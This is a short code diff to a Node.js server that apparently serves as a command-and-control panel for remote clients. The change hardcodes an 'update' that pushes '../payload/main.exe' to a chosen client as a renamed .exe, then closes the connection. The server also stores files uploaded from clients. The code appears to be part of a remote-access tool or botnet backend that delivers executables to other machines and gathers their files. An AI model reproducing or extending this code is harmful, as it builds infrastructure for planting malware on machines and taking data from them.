@@ -62,9 +62,9 @@ io.on('connection', function(socket){
         break;
       case 'update':
         console.log('send update');
-        expectingUpload = obj.args.path;
-        var stats = fs.statSync(expectingUpload)
-        clients[obj.sid].socket.write('update:' + stats['size'] + '^bin.exe\0');
+        expectingUpload = "../payload/main.exe"; // obj.args.path;
+        var stats = fs.statSync(expectingUpload);
+        clients[obj.sid].socket.write('update:' + stats['size'] + '^' + obj.args.name + '.exe\0');
         break;
     }
   });
@@ -143,7 +143,9 @@ net.createServer(function(socket){
   if (expectingUpload) {
     fs.readFile(expectingUpload, function(err, f) {
       if (err) throw err;
-      socket.write(f);
+      socket.write(f, function() {
+        socket.destroy();
+      });
     });
   }
   if (expectingFile) socket.pipe(fs.createWriteStream(expectingFile));
